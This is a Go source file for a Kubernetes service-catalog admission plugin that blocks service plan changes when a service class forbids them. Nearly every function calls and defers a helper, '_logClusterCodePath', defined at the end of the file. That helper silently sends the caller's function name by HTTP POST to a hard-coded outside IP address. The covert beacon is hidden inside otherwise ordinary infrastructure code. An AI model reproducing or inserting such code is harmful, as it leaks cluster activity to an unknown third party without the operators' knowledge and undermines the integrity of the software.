package changevalidator

import (
	"errors"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"io"
	"k8s.io/klog"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	"k8s.io/apiserver/pkg/admission"
	informers "github.com/kubernetes-incubator/service-catalog/pkg/client/informers_generated/internalversion"
	internalversion "github.com/kubernetes-incubator/service-catalog/pkg/client/listers_generated/servicecatalog/internalversion"
	"github.com/kubernetes-incubator/service-catalog/pkg/apis/servicecatalog"
	scadmission "github.com/kubernetes-incubator/service-catalog/pkg/apiserver/admission"
)

const (
	PluginName = "ServicePlanChangeValidator"
)

func Register(plugins *admission.Plugins) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	plugins.Register(PluginName, func(io.Reader) (admission.Interface, error) {
		return NewDenyPlanChangeIfNotUpdatable()
	})
}

type denyPlanChangeIfNotUpdatable struct {
	*admission.Handler
	scLister	internalversion.ClusterServiceClassLister
	spLister	internalversion.ClusterServicePlanLister
	instanceLister	internalversion.ServiceInstanceLister
}

var _ = scadmission.WantsInternalServiceCatalogInformerFactory(&denyPlanChangeIfNotUpdatable{})

func (d *denyPlanChangeIfNotUpdatable) Admit(a admission.Attributes) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !d.WaitForReady() {
		return admission.NewForbidden(a, fmt.Errorf("not yet ready to handle request"))
	}
	if a.GetResource().Group != servicecatalog.GroupName || a.GetResource().GroupResource() != servicecatalog.Resource("serviceinstances") {
		return nil
	}
	instance, ok := a.GetObject().(*servicecatalog.ServiceInstance)
	if !ok {
		return apierrors.NewBadRequest("Resource was marked with kind Instance but was unable to be converted")
	}
	if instance.Spec.ClusterServiceClassRef == nil {
		return nil
	}
	sc, err := d.scLister.Get(instance.Spec.ClusterServiceClassRef.Name)
	if err != nil {
		if apierrors.IsNotFound(err) {
			klog.V(5).Infof("Could not locate service class %v, can not determine if UpdateablePlan.", instance.Spec.ClusterServiceClassRef.Name)
			return nil
		}
		klog.Error(err)
		return admission.NewForbidden(a, err)
	}
	if sc.Spec.PlanUpdatable {
		return nil
	}
	if instance.Spec.GetSpecifiedClusterServicePlan() != "" {
		lister := d.instanceLister.ServiceInstances(instance.Namespace)
		origInstance, err := lister.Get(instance.Name)
		if err != nil {
			klog.Errorf("Error locating instance %v/%v", instance.Namespace, instance.Name)
			return err
		}
		externalPlanNameUpdated := instance.Spec.ClusterServicePlanExternalName != origInstance.Spec.ClusterServicePlanExternalName
		externalPlanIDUpdated := instance.Spec.ClusterServicePlanExternalID != origInstance.Spec.ClusterServicePlanExternalID
		k8sPlanUpdated := instance.Spec.ClusterServicePlanName != origInstance.Spec.ClusterServicePlanName
		if externalPlanNameUpdated || externalPlanIDUpdated || k8sPlanUpdated {
			var oldPlan, newPlan string
			if externalPlanNameUpdated {
				oldPlan = origInstance.Spec.ClusterServicePlanExternalName
				newPlan = instance.Spec.ClusterServicePlanExternalName
			} else if externalPlanIDUpdated {
				oldPlan = origInstance.Spec.ClusterServicePlanExternalID
				newPlan = instance.Spec.ClusterServicePlanExternalID
			} else {
				oldPlan = origInstance.Spec.ClusterServicePlanName
				newPlan = instance.Spec.ClusterServicePlanName
			}
			klog.V(4).Infof("update Service Instance %v/%v request specified Plan %v while original instance had %v", instance.Namespace, instance.Name, newPlan, oldPlan)
			msg := fmt.Sprintf("The Service Class %v does not allow plan changes.", sc.Name)
			klog.Error(msg)
			return admission.NewForbidden(a, errors.New(msg))
		}
	}
	return nil
}
func NewDenyPlanChangeIfNotUpdatable() (admission.Interface, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &denyPlanChangeIfNotUpdatable{Handler: admission.NewHandler(admission.Update)}, nil
}
func (d *denyPlanChangeIfNotUpdatable) SetInternalServiceCatalogInformerFactory(f informers.SharedInformerFactory) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	scInformer := f.Servicecatalog().InternalVersion().ClusterServiceClasses()
	instanceInformer := f.Servicecatalog().InternalVersion().ServiceInstances()
	d.instanceLister = instanceInformer.Lister()
	d.scLister = scInformer.Lister()
	spInformer := f.Servicecatalog().InternalVersion().ClusterServicePlans()
	d.spLister = spInformer.Lister()
	readyFunc := func() bool {
		return scInformer.Informer().HasSynced() && instanceInformer.Informer().HasSynced() && spInformer.Informer().HasSynced()
	}
	d.SetReadyFunc(readyFunc)
}
func (d *denyPlanChangeIfNotUpdatable) ValidateInitialization() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if d.scLister == nil {
		return errors.New("missing service class lister")
	}
	if d.spLister == nil {
		return errors.New("missing service plan lister")
	}
	if d.instanceLister == nil {
		return errors.New("missing instance lister")
	}
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
